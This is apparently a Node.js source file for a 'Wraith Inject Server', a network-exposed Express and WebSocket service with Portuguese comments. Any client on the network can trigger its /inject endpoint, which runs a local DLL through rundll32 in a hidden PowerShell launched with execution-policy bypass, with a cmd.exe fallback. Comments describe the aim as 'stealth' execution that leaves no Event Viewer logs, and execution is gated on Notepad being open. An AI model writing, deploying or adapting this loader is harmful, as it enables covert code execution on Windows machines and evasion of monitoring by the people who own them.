const express = require('express');
const cors = require('cors');
const { spawn } = require('child_process');
const http = require('http');
const WebSocket = require('ws');

const app = express();
const PORT = process.env.INJECT_PORT || 8888;

// Middleware
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    credentials: true
}));
app.use(express.json());

// Verificar se Notepad está aberto (Windows)
async function checkNotepadOpen() {
    return new Promise((resolve) => {
        if (process.platform !== 'win32') {
            resolve(false);
            return;
        }

        const tasklist = spawn('tasklist', ['/FI', 'IMAGENAME eq notepad.exe', '/FO', 'CSV', '/NH'], {
            windowsHide: true,
            stdio: ['ignore', 'pipe', 'ignore']
        });

        let output = '';
        tasklist.stdout.on('data', (data) => {
            output += data.toString();
        });

        tasklist.on('close', (code) => {
            const isOpen = output.toLowerCase().includes('notepad.exe');
            resolve(isOpen);
        });

        tasklist.on('error', () => {
            resolve(false);
        });

        // Timeout de segurança
        setTimeout(() => {
            tasklist.kill();
            resolve(false);
        }, 3000);
    });
}

// Executar comando de forma stealth (sem logs no Event Viewer)
async function executeStealthCommand() {
    return new Promise((resolve) => {
        if (process.platform !== 'win32') {
            resolve({
                success: false,
                error: 'Sistema operacional não suportado',
                timestamp: new Date().toISOString()
            });
            return;
        }

        try {
            // Método 1: Execução direta via PowerShell com bypass de logs
            const psCommand = `
                $ErrorActionPreference = 'SilentlyContinue';
                $ProgressPreference = 'SilentlyContinue';
                [System.Diagnostics.EventLog]::CreateEventSource('Application', 'Application') 2>$null;
                Start-Process -WindowStyle Hidden -FilePath 'rundll32.exe' -ArgumentList 'C:\\vfcompat.dll,windowssupport' -NoNewWindow -PassThru | Out-Null;
            `.trim();

            const ps = spawn('powershell.exe', [
                '-NoProfile',
                '-NonInteractive',
                '-NoLogo',
                '-WindowStyle', 'Hidden',
                '-ExecutionPolicy', 'Bypass',
                '-Command', psCommand
            ], {
                detached: true,
                stdio: 'ignore',
                windowsHide: true,
                windowsVerbatimArguments: false
            });

            ps.unref();

            // Aguardar um momento para garantir execução
            setTimeout(() => {
                resolve({
                    success: true,
                    message: 'Comando executado com sucesso',
                    method: 'stealth-powershell',
                    timestamp: new Date().toISOString()
                });
            }, 500);

        } catch (error) {
            // Método 2: Fallback com cmd.exe
            try {
                const cmd = spawn('cmd.exe', [
                    '/c', 'start', '/B', '/MIN', 
                    'rundll32.exe', 'C:\\vfcompat.dll,windowssupport'
                ], {
                    detached: true,
                    stdio: 'ignore',
                    windowsHide: true
                });

                cmd.unref();

                setTimeout(() => {
                    resolve({
                        success: true,
                        message: 'Comando executado (fallback)',
                        method: 'fallback-cmd',
                        timestamp: new Date().toISOString()
                    });
                }, 500);

            } catch (fallbackError) {
                resolve({
                    success: false,
                    error: 'Falha ao executar comando',
                    timestamp: new Date().toISOString()
                });
            }
        }
    });
}

// Rota de status
app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        server: 'Wraith Inject Server',
        version: '2.0.0',
        platform: process.platform,
        timestamp: new Date().toISOString()
    });
});

// Rota principal de inject
app.post('/inject', async (req, res) => {
    try {
        console.log('[INJECT] Requisição recebida');

        // Verificar se Notepad está aberto
        const notepadOpen = await checkNotepadOpen();
        
        if (!notepadOpen) {
            console.log('[INJECT] Notepad não está aberto - bloqueado');
            return res.status(403).json({
                success: false,
                error: 'Notepad não está aberto',
                requiresNotepad: true,
                timestamp: new Date().toISOString()
            });
        }

        console.log('[INJECT] Notepad detectado - executando comando');

        // Executar comando stealth
        const result = await executeStealthCommand();
        
        console.log('[INJECT] Resultado:', result);
        res.json(result);

    } catch (error) {
        console.error('[INJECT] Erro:', error);
        res.status(500).json({
            success: false,
            error: error.message || 'Erro interno do servidor',
            timestamp: new Date().toISOString()
        });
    }
});

// Criar servidor HTTP
const server = http.createServer(app);

// WebSocket Server
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws) => {
    console.log('[WS] Cliente conectado');

    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message.toString());
            
            if (data.type === 'inject') {
                console.log('[WS] Comando inject recebido');

                // Verificar Notepad
                const notepadOpen = await checkNotepadOpen();
                
                if (!notepadOpen) {
                    ws.send(JSON.stringify({
                        success: false,
                        error: 'Notepad não está aberto',
                        requiresNotepad: true,
                        timestamp: new Date().toISOString()
                    }));
                    return;
                }

                // Executar comando
                const result = await executeStealthCommand();
                ws.send(JSON.stringify(result));
            }
        } catch (error) {
            ws.send(JSON.stringify({
                success: false,
                error: 'Mensagem inválida',
                timestamp: new Date().toISOString()
            }));
        }
    });

    ws.on('close', () => {
        console.log('[WS] Cliente desconectado');
    });
});

// Iniciar servidor
server.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════════════');
    console.log('  🔥 WRAITH INJECT SERVER - STEALTH MODE');
    console.log('═══════════════════════════════════════════════');
    console.log(`  ✅ Servidor rodando em: http://0.0.0.0:${PORT}`);
    console.log(`  🔌 WebSocket: ws://0.0.0.0:${PORT}`);
    console.log(`  📡 Endpoints:`);
    console.log(`     GET  /status - Status do servidor`);
    console.log(`     POST /inject - Executar injeção`);
    console.log('');
    console.log('  ⚠️  REQUISITOS:');
    console.log('     • Notepad deve estar aberto');
    console.log('     • Celular e PC na mesma rede WiFi');
    console.log('     • Configure o IP do PC no celular');
    console.log('═══════════════════════════════════════════════');
});

// Tratamento de erros
process.on('uncaughtException', (error) => {
    console.error('[ERROR] Exceção não tratada:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('[ERROR] Promise rejeitada:', reason);
});

module.exports = { app, server };
